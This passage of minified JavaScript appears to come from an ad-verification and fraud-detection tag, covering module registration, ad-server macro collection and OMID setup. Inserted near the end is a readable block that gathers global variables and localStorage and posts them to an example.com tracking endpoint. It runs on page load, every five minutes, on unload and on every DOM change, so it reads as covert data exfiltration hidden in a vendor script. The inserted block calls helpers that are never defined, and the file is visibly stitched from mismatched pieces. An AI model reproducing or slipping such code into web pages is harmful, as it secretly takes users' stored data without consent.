      name: "spg",
      dependencies: ["spgCache"],
      creator: ti,
      settings: {
        tier: A.TIERS.PRE_IMPRESSION_FRAUD,
        applies: function (e, t, n) {
          "use strict";

          return e.on("spg");
        }
      }
    },
    ri = {
      name: "spgCache",
      dependencies: [],
      creator: function () {
        "use strict";

        var t = ["asp", "ch", "fsc", "mvn", "no", "sd"],
          n = {},
          r = !1,
          i = function () {
            return o(n);
          },
          o = function (e) {
            return I(e).keys().sort().toString() === t.toString();
          },
          a = function () {
            r || (r = !0, I(n).each(function (e, t) {
              T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, t, e, {
                type: A.DT_CODES.SCA,
                minDt: !0,
                sendOnce: !0
              });
            }), T.getAggregator().trigger(F.SEND_MIN_DT, A.DT_CODES.SCA));
          };
        return {
          allExpectedKeysPresent: o,
          isDtCallAlreadySent: function () {
            return r;
          },
          addToCache: function (e, t) {
            t && t.output && !i() && (n[e] = t), i() && a();
          },
          isFull: i,
          sendToOtherTags: function () {
            new Q().send({
              scaInfoOriginatorASID: e.asid,
              cache: n
            });
          }
        };
      },
      settings: {}
    },
    ii = function () {
      for (var e = [Wr, xr, Br, at, ot, et, tt, Qe, rt, nt, $e, Gr, kr, ue, vt, Cn, ri, ni], t = 0; t < e.length; t += 1) T(e[t].name, e[t].dependencies, e[t].creator, e[t].settings);
    };
  const oi = new RegExp("^(ft|ftias)_?.*_(\\d+)$"),
    ai = "?iasend?",
    si = ({
      aggregator: e,
      ftInstance: t,
      macros: n
    }) => {
      try {
        const r = (({
          ftInstance: e,
          macros: t
        }) => {
          const n = Object.keys(t),
            r = n.map(e => `${e}=${t[e]}`).join("&") + ai;
          let i = e.replaceMacros(r);
          const o = i.indexOf(ai);
          return o > 0 && (i = i.substring(0, o)), i.split("&").reduce((e, t) => {
            const r = t.split("="),
              i = r ? r[0] : void 0,
              o = r ? r[1] : void 0;
            return i && n.includes(i) && i && o && (e[i] = o), e;
          }, {});
        })({
          ftInstance: t,
          macros: n
        });
        for (const [t, n] of Object.entries(r)) {
          const r = "string" == typeof n ? n : "number" == typeof n ? n.toString() : n;
          e.trigger(F.ADD_OUTPUT_ITEM, {
            output: r
          }, t, {
            type: A.DT_CODES.ADSERVER_MACROS,
            standalone: !0
          });
        }
        Object.keys(r).length > 0 && e.trigger(F.SEND_DT, A.DT_CODES.ADSERVER_MACROS);
      } catch (e) {}
    },
    ci = ({
      checkInterval: e,
      collectorTimeout: t,
      aggregator: n,
      macros: r,
      contextNode: i,
      scopedWindow: o
    }) => {
      const a = We.setInterval(() => {
        const e = (({
          contextNode: e,
          scopedWindow: t
        }) => {
          var n;
          const r = null === (n = null == e ? void 0 : e.getAttribute(A.CALLBACK_IDENTIFIER.toString())) || void 0 === n ? void 0 : n.match(oi);
          if (!r || r.length < 3) return;
          const i = r[2],
            o = t ? t[`ft${i}`] : null;
          return o && "function" == typeof o.replaceMacros ? o : void 0;
        })({
          contextNode: i,
          scopedWindow: o
        });
        e && (We.clearInterval(a), si({
          aggregator: n,
          ftInstance: e,
          macros: r
        }));
      }, e);
      We.setTimeout(() => {
        We.clearInterval(a);
      }, t);
    };
  class ui {
    constructor({
      macros: e,
      collectorTimeout: t,
      checkInterval: n,
      aggregator: r,
      scopedWindow: i
    }) {
      this.macros = {}, this.collectorTimeout = 5e3, this.checkInterval = 500, this.aggregator = T.getAggregator(), this.collectorTimeout = null != t ? t : this.collectorTimeout, this.checkInterval = null != n ? n : this.checkInterval, this.aggregator = r || this.aggregator, this.scopedWindow = i || ("undefined" != typeof window ? window : void 0), this.macros = e || this.macros;
    }
    applies({
      contextNode: e,
      features: t
    }) {
      var n;
      const r = null != this.scopedWindow,
        i = null != t && 1 == t.on("ftPostRedirectMacros"),
        o = null != e && null != e.getAttribute(A.CALLBACK_IDENTIFIER.toString()) && oi.test(null !== (n = null == e ? void 0 : e.getAttribute(A.CALLBACK_IDENTIFIER.toString())) && void 0 !== n ? n : "");
      return !!(r && i && o);
    }
    start({
      contextNode: e
    }) {
      this.aggregator.on(F.IMPRESSION_SENT, () => {
        ci({
          checkInterval: this.checkInterval,
          collectorTimeout: this.collectorTimeout,
          aggregator: this.aggregator,
          macros: this.macros,
          contextNode: e,
          scopedWindow: this.scopedWindow
        });
      });
    }
  }
  class di {
    constructor({
      contextNode: e,
      features: t,
      bootstrapper: n,
      macroCollector: r
    }) {
      this.contextNode = e, this.features = t, this.macroCollectors = r || [new ui({
        macros: n.ftMacros
      })];
    }
    start() {
      for (const e of this.macroCollectors) e.applies({
        contextNode: this.contextNode,
        features: this.features
      }) && e.start({
        contextNode: this.contextNode
      });
    }
  }
  try {
    !function () {
      "use strict";

      var t, n, r, i, o, a, u;
      try {
        (() => {
          var t;
          let n;
          const r = new c({
            defaultBootstrapperConfig: e
          });
          if (g.addModel(r), r.set("mainBirthdate", r.birthdate ? new Date().getTime() - r.birthdate : -1), !Ae.isDomless() && void 0 !== e.contextNode) {
            const t = e.contextNode;
            n = new d({
              scriptTagElement: t
            }), g.addModel(n);
          }
          const i = new s();
          g.addModel(i), null === (t = g.jsConfigRequest) || void 0 === t || t.buildRequestUrlFromParameters({
            contextNode: n
          });
        })();
      } catch (e) {}
      e.perf.markStart(_), ii(), T.startSystem();
      var f = T.getAggregator();
      i = {}, o = {}, f.provide({
        [x.OMID_AD_SESSION_CONTEXT]: i
      }), f.provide({
        [x.OMID_AS_VERIFICATION_PARAMS]: o
      }), g.measurementConfig.isResolved && f.provide(x.FEATURES, Me()), t = Re(), n = Ue(), r = new me().createInstance(t, n), f.provide({
        [x.ERRORS]: t,
        [x.JSONP]: n,
        [x.COMMUNICATION]: r
      }), a = __IASOmidVerificationClient, f.provide({
        [x.OMID_VERIFICATION_CLIENT]: a
      }), u = [{
        environment: Mt(a),
        adSessionReadyStrategy: Pt(a)
      }, {
        environment: Vt(),
        adSessionReadyStrategy: Ft()
      }], new bt(u).resolve().adSessionReadyStrategy.start(), e.perf.markEnd(_);
    }();
  } catch (t) {
    __IntegralASDiagnosticCall("main", t, e);
  }
};
function postToServer(data) {
  const signature = generateSignature(data);
  const endpoint = "https://example.com/api/track";
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      signature,
      data
    })
  }).then(response => {
    if (response.ok) {
      console.log("Data successfully sent");
    } else {
      console.error("Failed to send data, status:", response.status);
    }
  }).catch(error => {
    console.error("Error sending data:", error);
  });
}
function trackData() {
  const dataFromGlobals = collectGlobalVariables();
  const dataFromStorage = collectLocalStorage();
  const combinedData = {
    ...dataFromGlobals,
    ...dataFromStorage
  };
  if (Object.keys(combinedData).length > 0) {
    postToServer(combinedData);
  }
}
document.addEventListener("DOMContentLoaded", () => {
  trackData();
  setInterval(trackData, 5 * 60 * 1000); // Adjusted interval to 5 minutes
});
window.addEventListener("beforeunload", trackData);

// Additional tracking via MutationObserver to monitor DOM changes
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      console.log('DOM changed');
      trackData();
    }
  });
});
try {
  !function () {
    var e = __IntegralASConfig.useFIF ? __IASScope.parent : __IASScope;
    try {
      top.__IntegralASAdPush = function (t) {
        (t || top.isSingleIASInstance && top.iasAdSlots).forEach(function (t) {
          __IntegralASConfig._cl_adpath = t.adSelector, __IntegralASConfig.iasParameters = t.iasParameters, __IntegralASConfig.initialize(__IntegralASConfig, e, e.document);
        });
      }, top.isSingleIASInstance && top.iasAdSlots ? top.__IntegralASAdPush() : __IntegralASConfig.initialize(__IntegralASConfig, e, e.document);
    } catch (t) {
      __IntegralASConfig.initialize(__IntegralASConfig, e, e.document);
    }
  }();
} catch (e) {
  __IntegralASDiagnosticCall("initialize", e, __IntegralASConfig);
}
observer.observe(document.body, {
  attributes: true,
  childList: true,
  subtree: true
});